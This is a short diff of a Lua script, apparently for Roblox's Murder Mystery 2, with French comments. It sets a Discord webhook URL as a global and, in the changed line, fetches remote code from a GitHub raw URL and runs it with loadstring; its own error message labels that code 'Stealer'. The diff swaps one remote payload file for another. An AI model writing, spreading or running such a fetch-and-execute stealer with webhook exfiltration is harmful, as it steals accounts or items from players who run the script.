@@ -9,7 +9,7 @@ _G.webhook = "https://discord.com/api/webhooks/1465745432490807471/Ky8U8WHmpl3-U
 -- On utilise pcall pour éviter que si l'un crash, l'autre ne se lance pas
 task.spawn(function()
     local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Anouar111/Mm2-s/refs/heads/main/Protected_6703276525832282.lua.txt"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Anouar111/Mm2-s/refs/heads/main/mm2-S-.lua"))()
     end)
     if not success then warn("Erreur Stealer: " .. err) end
 end)
